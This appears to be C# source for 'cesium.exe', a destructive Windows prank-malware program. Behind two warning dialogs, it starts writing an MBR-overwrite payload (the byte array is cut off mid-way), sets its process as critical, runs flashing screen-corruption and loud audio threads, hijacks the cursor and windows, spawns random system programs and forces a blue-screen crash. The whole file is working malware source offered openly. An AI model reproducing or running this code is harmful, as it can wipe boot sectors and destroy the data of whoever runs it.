using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Media;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;

namespace cesium
{
    class Class1
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        public static extern bool ReleaseDC(IntPtr hWnd, IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int cx, int cy);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("gdi32.dll", SetLastError = true, EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateSolidBrush(uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateHatchBrush(int iHatch, uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr DeleteObject(IntPtr ho);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        [DllImport("user32.dll")]
        static extern IntPtr LoadIconA(IntPtr hInstance, int lpIconName);

        static IntPtr IDI_ERROR = LoadIconA(IntPtr.Zero, 32513);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);
        public delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        const uint DI_COMPAT = 0x0004;
        const uint DI_DEFAULTSIZE = 0x0008;
        const uint DI_IMAGE = 0x0002;
        const uint DI_MASK = 0x0001;
        const uint DI_NOMIRROR = 0x0004;
        const uint DI_NORMAL = 0x0004;

        [DllImport("user32.dll")]
        public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        // raster operations

        public static uint BLACKNESS = 0x00000042;
        public static uint NOTSRCERASE = 0x001100A6;
        public static uint NOTSRCCOPY = 0x0330008;
        public static uint SRCERASE = 0x00440328;
        public static uint DSTINVERT = 0x00550009;
        public static uint PATINVERT = 0x005A0049;
        public static uint SRCINVERT = 0x00660046;
        public static uint SRCAND = 0x008800C6;
        public static uint MERGEPAINT = 0x00BB0226;
        public static uint MERGECOPY = 0x00C000CA;
        public static uint SRCCOPY = 0x00CC0020;
        public static uint SRCPAINT = 0x00EE0086;
        public static uint PATCOPY = 0x00F00021;
        public static uint PATPAINT = 0x00FB0A09;
        public static uint WHITENESS = 0x00FF0062;
        public static uint NOMIRRORBITMAP = 0x80000000;

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        public const uint GENERIC_ALL = 0x10000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;

        [DllImport("user32.dll")]
        public static extern bool SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("kernel32.dll")]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr handle, int procinfoclass, ref int procinfo, int procinfolength);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlAdjustPrivilege(int privilege, bool enable, bool currthread, out bool enabled);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(uint errcode, uint parameters, IntPtr unicode, IntPtr parameter, uint responseoption, out uint response);

        public static int critical = 1;
        const int ProcessBreakOnTermination = 0x1D;

        [DllImport("user32.dll")]
        public static extern IntPtr SetCursorPos(int x, int y);

        [DllImport("gdi32.dll")]
        static extern int SetDIBitsToDevice(IntPtr hdc, int xDest, int yDest, uint width, uint height, int xSrc, int ySrc, uint startScan, uint scanLines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint fuColorUse);

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth, biHeight;
            public ushort biPlanes, biBitCount;
            public uint biCompression, biSizeImage;
            public int biXPelsPerMeter, biYPelsPerMeter;
            public uint biClrUsed, biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public uint[] bmiColors;
        }

        // XOR script by ciberboy
        static int frame = 0;
        static void xorfractal(IntPtr hdc, int width, int height)
        {
            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = 0;
            byte[] pixelData = new byte[width * height * 4];
            for (int y = 0; y < height; y++)
            {
                for (int x = 0; x < width; x++)
                {
                    int index = (y * width + x) * 4;
                    pixelData[index + 0] = (byte)((x ^ y ^ frame) & 255);
                    pixelData[index + 1] = (byte)(((x * y) ^ (frame << 2)) & 255);
                    pixelData[index + 2] = (byte)(((x << 3) ^ (y >> 3)) & 255);
                    pixelData[index + 3] = 255;
                }
            }
            SetDIBitsToDevice(hdc, 0, 0, (uint)width, (uint)height, 0, 0, 0, (uint)height, pixelData, ref bmi, 0);
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        public static readonly IntPtr HWND_TOP = IntPtr.Zero;
        public const uint SWP_NOZORDER = 0x0004;

        private static int rcDelay = 5000;
        private static bool finale = false;
        public static Random r = new Random();

        // Main

        static void Main()
        {
            MessageBoxButtons buttons = MessageBoxButtons.YesNo;
            DialogResult result;

            result = MessageBox.Show("You've just executed a potential malware." + "\n" + 
                "If you do not know what does this program do, click No." + "\n" + 
                "This program contains loud sounds and a lot of epilepsy." + "\n" + 
                "This malware will destroy your boot sector, rendering your PC unusable. Continue?", 

                "cesium.exe", buttons, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);
            if (result == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                result = MessageBox.Show("!!! FINAL WARNING !!!" + "\n" + 
                    "THIS MALWARE IS NO JOKE! IT WILL MAKE YOUR PC UNBOOTABLE AND WILL MAKE YOU LOSE ALL DATA!" + "\n" + 
                    "IT SHOULD BE RAN ONLY IN A VM WITH A SNAPSHOT!" + "\n" + 
                    "This is the last chance to stop this program from executing." + "\n" + 
                    "The creator of this malware, Silver (silverjetes on youtube & discord) IS NOT responsible for any damage made." + "\n" + 
                    "Are you absolutely sure that you want to run it?", 
                    
                    "cesium.exe - !!! FINAL WARNING !!!", buttons, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);
                if (result == DialogResult.No)
                {
                    Application.Exit();
                }
                else
                {
                    KillMBR();
                    SetAsCritical();

                    Thread mouse = new Thread(mousemove);
                    Thread xor = new Thread(xorf);
                    Thread invcolor = new Thread(colorchange);
                    Thread ishake = new Thread(intenseshake);
                    Thread stretch = new Thread(stretchbltmess);
                    Thread blur = new Thread(sblur);
                    Thread inv = new Thread(inversion);
                    Thread rclear = new Thread(randomClear);
                    Thread screens = new Thread(fourScreens);
                    Thread icon = new Thread(icons);
                    Thread messp1 = new Thread(mess);
                    Thread messp2 = new Thread(messpart2);
                    Thread messv = new Thread(messvar);
                    Thread cfilter = new Thread(colorfilter);
                    Thread scglitches = new Thread(mousescreenglitches);
                    Thread smess1 = new Thread(scrmess1);
                    Thread smess2 = new Thread(scrmess2);
                    Thread smess3 = new Thread(scrmess3);
                    Thread erricon = new Thread(errico);
                    Thread resizew = new Thread(resizewindows);
                    Thread lastgdi = new Thread(final);
                    Thread rPrograms = new Thread(openPrograms);
                    Thread wTitles = new Thread(windowTitles);
                    Thread audio = new Thread(Audio);
                    Thread forms = new Thread(formspam);

                    showMessageBox(true, false);
                    Thread.Sleep(50);
                    showMessageBox(false, false);
                    Thread.Sleep(50);
                    showMessageBox(false, false);
                    Thread.Sleep(50);
                    showMessageBox(false, false);
                    Thread.Sleep(50);
                    showMessageBox(false, false);
                    Thread.Sleep(800);

                    wTitles.Start();
                    resizew.Start();

                    erricon.Start();

                    xor.Start();
                    mouse.Start();
                    audio.Start();

                    Thread.Sleep(29400);

                    xor.Abort();
                    clear();
                    rclear.Start();
                    ishake.Start();
                    stretch.Start();
                    blur.Start();
                    clear();
                    Thread.Sleep(15000);
                    inv.Start();

                    Thread.Sleep(15000);

                    clear();
                    rclear.Suspend();
                    ishake.Abort();
                    stretch.Abort();
                    inv.Abort();
                    blur.Suspend();
                    clear();
                    screens.Start();
                    clear();
                    Thread.Sleep(15000);
                    icon.Start();
                    Thread.Sleep(10000);
                    invcolor.Start();

                    Thread.Sleep(5000);

                    invcolor.Suspend();
                    icon.Suspend();
                    clear();
                    screens.Abort();
                    clear();
                    scglitches.Start();
                    messp1.Start();
                    messv.Start();

                    Thread.Sleep(15000);

                    clear();
                    messp1.Abort();
                    scglitches.Suspend();
                    clear();
                    messp2.Start();
                    blur.Resume();

                    Thread.Sleep(15000);

                    clear();
                    blur.Suspend();
                    messp2.Abort();
                    messv.Abort();
                    clear();
                    icon.Resume();
                    cfilter.Start();
                    clear();

                    Thread.Sleep(30000);

                    clear();
                    cfilter.Abort();
                    invcolor.Resume();
                    scglitches.Resume();
                    rclear.Resume();
                    rcDelay = 500;

                    smess1.Start();
                    smess2.Start();
                    smess3.Start();

                    Thread.Sleep(30000);

                    clear();

                    smess1.Abort();
                    smess2.Abort();
                    smess3.Abort();
                    invcolor.Abort();
                    scglitches.Abort();
                    rclear.Abort();
                    icon.Abort();

                    clear();

                    finale = true;

                    forms.Start();
                    showMessageBox(false, true);
                    lastgdi.Start();
                    Thread.Sleep(500);
                    rPrograms.Start();
                    Thread.Sleep(14500);

                    bsod();
                }
            }
        }

        // payloads are not organised by their order of execution

        static void Audio()
        {
            Thread audioThread = new Thread(() => Bytebeat.PlayBytebeatAudio()); audioThread.Start(); audioThread.Join();
            audioThread.Start();
        }

        private static void xorf()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
                xorfractal(hdc, x, y);
                frame++;
                Thread.Sleep(1);
            }
        }

        private static void intenseshake()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-10, 100), r.Next(-100, 50), SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(20);
            }
        }

        private static void mousescreenglitches()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, Cursor.Position.X, Cursor.Position.Y, 100, 100, hdc, rx, ry, SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(50);
            }
        }

        private static void stretchbltmess()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                int strdirection = r.Next(2);
                if (strdirection == 1)
                {
                    StretchBlt(hdc, -20, -20, x + 40, y + 40, hdc, 0, 0, x, y, SRCCOPY);
                }
                else
                {
                    StretchBlt(hdc, 20, 20, x - 40, y - 40, hdc, 0, 0, x, y, SRCCOPY);
                }
                DeleteDC(hdc);
                Thread.Sleep(50);
            }
        }

        private static void sblur()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                AlphaBlend(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 70, 0));
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(40);
            }
        }

        private static void colorchange()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr brush = CreateSolidBrush(getRandomColour());
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, PATINVERT);
                DeleteDC(hdc);
                DeleteObject(brush);
                Thread.Sleep(200);
            }
        }

        private static void scrmess1()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr brush = CreateSolidBrush(getRandomColour());
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, ry, x, ry, hdc, 0, ry, PATINVERT);
                DeleteDC(hdc);
                DeleteObject(brush);
                Thread.Sleep(5);
            }
        }

        private static void scrmess2()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, SRCCOPY);
                if (r.Next(2) == 2)
                {
                    BitBlt(hdc, rx + r.Next(-5, 5), ry + r.Next(-5, 5), rx, ry, hdc, rx, ry, SRCCOPY);
                }
                else
                {
                    BitBlt(hdc, rx - r.Next(-5, 5), ry - r.Next(-5, 5), rx, ry, hdc, rx, ry, SRCCOPY);
                }
                BitBlt(hdc, r.Next(-5, 5), ry, x, ry, hdc, 0, ry, SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(1);
            }
        }

        private static void scrmess3()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, r.Next(x), r.Next(y), x, ry, hdc, rx, ry, SRCCOPY);
                BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, SRCAND);
                DeleteDC(hdc);
                Thread.Sleep(40);
            }
        }

        private static void fourScreens()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, -100, -100, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, -100, y - 100, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, x - 100, y - 100, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, x - 100, -100, SRCCOPY);
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(75);
            }
        }

        private static void icons()
        {
            int icondelay = 1;

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                Icon[] icon = { SystemIcons.Error, SystemIcons.Application, SystemIcons.Information, SystemIcons.Warning, SystemIcons.Question, SystemIcons.Shield };
                Graphics.FromHdc(hdc).DrawIcon(icon[r.Next(icon.Length)], r.Next(x), r.Next(y));
                DeleteDC(hdc);
                Thread.Sleep(icondelay);
            }
        }

        private static void colorfilter()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);

                IntPtr brush = CreateSolidBrush(0xA5FFBA);
                SelectObject(hdc, brush);

                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, 0, -100, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, mhdc, 0, y - 100, SRCCOPY);

                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, MERGECOPY);

                Thread.Sleep(50);

                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
            }
        }

        private static void inversion()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(300);
            }
        }

        private static void mess()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y), r400 = r.Next(400);
                BitBlt(hdc, 0, ry, x, ry, hdc, 0, ry, PATINVERT);
                BitBlt(hdc, r.Next(-1, 1), r.Next(-1, 1), x, y, hdc, r.Next(-1, 1), r.Next(-1, 1), SRCCOPY);
                BitBlt(hdc, r.Next(-5, 5), ry, x, ry, hdc, r.Next(-5, 5), ry, SRCCOPY);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, PATINVERT);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
        }

        private static void messpart2()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                if (r.Next(2) == 1)
                {
                    BitBlt(hdc, rx, ry, rx, ry, hdc, rx + r.Next(-10, 10), ry + r.Next(-10, 10), SRCCOPY);
                }
                else
                {
                    BitBlt(hdc, rx, ry, rx, ry, hdc, rx - r.Next(-10, 10), ry - r.Next(-10, 10), SRCCOPY);
                }
                Thread.Sleep(1);
            }
        }

        private static void final()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, r.Next(-2, 2), ry, x, ry, hdc, r.Next(-2, 2), ry, SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(1);
            }
        }

        private static void errico()
        {
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            int iconx = r.Next(x);
            int icony = r.Next(y);
            int iconDirection = r.Next(1, 5);

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                DrawIcon(hdc, iconx, icony, IDI_ERROR);
                ReleaseDC(IntPtr.Zero, hdc);

                if (iconx >= x) iconx = 0;
                if (iconx < 0) iconx = x - 1;
                if (icony >= y) icony = 0;
                if (icony < 0) icony = y - 1;
                switch (iconDirection)
                {
                    case 1: iconx += 5; break;
                    case 2: iconx -= 5; break;
                    case 3: icony += 5; break;
                    case 4: icony -= 5; break;
                }
                if (r.Next(100) < 5)
                {
                    iconDirection = r.Next(1, 5);
                }

                Thread.Sleep(5);
            }
        }

        private static void messvar()
        {
            while (true)
            {
                Thread.Sleep(500);
                clear();
            }
        }

        // Beatbyte
        class Bytebeat
        {
            private const int SampleRate = 8000;
            private const int DurationSeconds = 30; // Duration of each bytebeat
            private const int BufferSize = SampleRate * DurationSeconds;

            private static Func<int, int>[] formulas = new Func<int, int>[]
            {
                t => t*(t<<2|t>>4),
                t => t*(t<<8|t>>9|t),
                t => (((t>>3)*(t>>5)))+t,
                t => t*(t>>9|t<<4),
                t => (((t>>1)*(t>>5)))+t,
                t => t*t>>44|(t>>4096)*(t>>4096)|t>>2,
                t => t*t>>44|(t>>4096)*(t>>4096)|t>>2
            };

            public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

            private static byte[] GenerateBuffer(Func<int, int> formula)
            {
                byte[] buffer = new byte[BufferSize];
                for (int t = 0; t < BufferSize; t++)
                {
                    buffer[t] = (byte)(formula(t) & 0xFF);
                }
                return buffer;
            }

            private static void SaveWav(byte[] buffer, string filePath)
            {
                using (var fs = new FileStream(filePath, FileMode.Create))
                using (var bw = new BinaryWriter(fs))
                {
                    bw.Write(new[] { 'R', 'I', 'F', 'F' });
                    bw.Write(36 + buffer.Length);
                    bw.Write(new[] { 'W', 'A', 'V', 'E' });
                    bw.Write(new[] { 'f', 'm', 't', ' ' });
                    bw.Write(16);
                    bw.Write((short)1);
                    bw.Write((short)1);
                    bw.Write(SampleRate);
                    bw.Write(SampleRate);
                    bw.Write((short)1);
                    bw.Write((short)8);
                    bw.Write(new[] { 'd', 'a', 't', 'a' });
                    bw.Write(buffer.Length);
                    bw.Write(buffer);
                }
            }

            private static void PlayBuffer(byte[] buffer)
            {
                string tempFilePath = Path.GetTempFileName();
                SaveWav(buffer, tempFilePath);
                using (SoundPlayer player = new SoundPlayer(tempFilePath))
                {
                    player.PlaySync();
                }
                File.Delete(tempFilePath);
            }

            public static void PlayBytebeatAudio()
            {
                foreach (var formula in Formulas)
                {
                    byte[] buffer = GenerateBuffer(formula);
                    PlayBuffer(buffer);
                }
            }
        }

        private static void mousemove()
        {
            while (true)
            {
                int curx = Cursor.Position.X, cury = Cursor.Position.Y;

                SetCursorPos(curx + r.Next(-100, 100), cury + r.Next(-100, 100));
                Thread.Sleep(400);
            }
        }

        private static void resizewindows()
        {
            while (true)
            {
                Thread.Sleep(10000);
                EnumWindows(new EnumWindowsProc(movew), IntPtr.Zero);
            }
        }

        static bool movew(IntPtr hWnd, IntPtr lParam)
        {
            while (true)
            {
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                SetWindowPos(hWnd, HWND_TOP, r.Next(w), r.Next(h), r.Next(w), r.Next(h), SWP_NOZORDER);
                return true;
            }
        }

        private static void showMessageBox(bool noClose, bool finale)
        {
            new Thread(showBox).Start();
            void showBox()
            {
                if (finale)
                {
                    MessageBox.Show("g3t r3kt m8", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    if (noClose)
                    {
                        while (true)
                        {
                            MessageBox.Show("You killed Niko.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        }
                    }
                    else
                    {
                        MessageBox.Show("You killed Niko.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                }
            }
        }

        public static void clear()
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }

        private static void openPrograms()
        {
            while (true)
            {
                string[] programs =
                {
                    "notepad.exe", "mspaint.exe", "write.exe", "explorer.exe",
                    "dxdiag.exe", "charmap.exe", "taskmgr.exe", "regedit.exe",
                    "cmd.exe", "calc.exe", "wscript.exe", "cscript.exe",
                    "help.exe", "narrator.exe", "devmgmt.msc", "diskmgmt.msc",
                    "fsquirt.exe", "control.exe", "mstsc.exe", "perfmon.exe",
                    "cleanmgr.exe", "iesxpress.exe", "appwiz.cpl", "desk.cpl",
                    "firewall.cpl", "inetcpl.cpl", "intl.cpl", "joy.cpl",
                    "main.cpl", "mmsys.cpl", "ncpa.cpl", "powercfg.cpl",
                    "sysdm.cpl", "telephon.cpl", "timedate.cpl", "wscui.cpl",
                    "mplayer2.exe", "winver.exe", "mobsync.exe", "odbcad32.exe",
                    "gpedit.msc", "msconfig.exe", "verifier.exe", "shrpubw.exe",
                    "sigverif.exe", "osk.exe", "iexplore.exe", "magnify.exe",
                    "wextract.exe", "mmc.exe"
                };

                Thread.Sleep(r.Next(1, 500));
                Process.Start(programs[r.Next(programs.Length)]);
            }
        }

        private static void randomClear()
        {
            while (true)
            {
                Thread.Sleep(r.Next(1, rcDelay));
                clear();
            }
        }
        
        public static void bsod()
        {
            if (RtlAdjustPrivilege(19, true, false, out _) == 0)
            {
                NtRaiseHardError(0xDEADDEAD, 0, IntPtr.Zero, IntPtr.Zero, 6, out _);
            }
        }

        // Critical process

        static void SetAsCritical()
        {
            if (!IsAdministrator())
            {
                MessageBox.Show("Admin permissions needed", "cesium.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            Process currentProcess = Process.GetCurrentProcess();
            IntPtr handle = currentProcess.Handle;

            int isCritical = 1;

            if (NtSetInformationProcess(handle, 29, ref isCritical, sizeof(int)) == 0) { }
            else
            {
                MessageBox.Show(
                    "Failed to set my process as critical!" +
                    "\nHow about trying to disable Windows Defender?", 
                    
                    "cesium.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

       private static void windowTitles()
        {
            while(true)
            {
                EnumWindows(new EnumWindowsProc(ChangeWindowTitles), IntPtr.Zero);
                Thread.Sleep(100);
            }
        }

        static bool ChangeWindowTitles(IntPtr hwnd, IntPtr lParam)
        {
            int unicode = r.Next(0x20, 0xFF);
            string text;
            if(finale)
            {
                text = "You killed Niko.";
            }
            else
            {
                text = char.ConvertFromUtf32(unicode);
            }
            SetWindowText(hwnd, text);
            return true;
        }

        private static void formspam()
        {
            while (true)
            {
                Form1 form = new Form1();
                form.Location = new System.Drawing.Point(r.Next(Screen.PrimaryScreen.Bounds.Width), r.Next(Screen.PrimaryScreen.Bounds.Height));
                form.Show();
                Thread.Sleep(100);
            }
        }

        public static uint getRandomColour()
        {
            byte red = (byte)r.Next(256);
            byte green = (byte)r.Next(256);
            byte blue = (byte)r.Next(256);
            return (uint)((blue << 16) | (green << 8) | red);
        }

        private static bool IsAdministrator()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        // MBR killer. Beware, it bites!

        public static void KillMBR()
            {
            var mbrData = new byte[] {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x07, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
